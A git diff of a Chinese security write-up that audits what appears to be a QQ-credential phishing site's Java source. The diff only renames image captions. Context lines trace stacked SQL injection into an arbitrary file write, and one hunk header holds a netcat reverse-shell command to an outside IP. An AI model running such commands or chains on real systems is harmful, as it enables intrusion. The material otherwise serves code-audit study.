@@ -162,9 +162,9 @@ cmd=nc 156.238.233.9 9999 -e /bin/sh
 
 拿到源码先放到IDEA里面慢慢看，我进来就看到了查询语句和waf
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 首先顺序是看路由然后再看关键代码所以我这么看纯是看到死耗子了，因为这里代码比较少，如果是框架就jj
 
@@ -176,7 +176,7 @@ message = "您的QQ账号密码已经泄露，请立即修改密码";
 
 看看插入日志的函数好像可以利用诶
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 其中查看这个配置文件，`config.properties`
 
@@ -188,11 +188,11 @@ db_password=root
 
 `allowMultiQueries=true`可以一次性执行多次sql语句，也就是堆叠注入，接着我们跟进到`LogUtil.save`，
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 但是没有什么用，继续跟进`FileUtil.SaveFileAs`，
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 这里`FileWriter`的第二个参数是false所以是覆盖文件内容，而参数是我们刚才的username和password，username为内容，password为路径，那么我们的目的就是先让其异常，然后再写入恶意文件即可，插入语句报错是
 
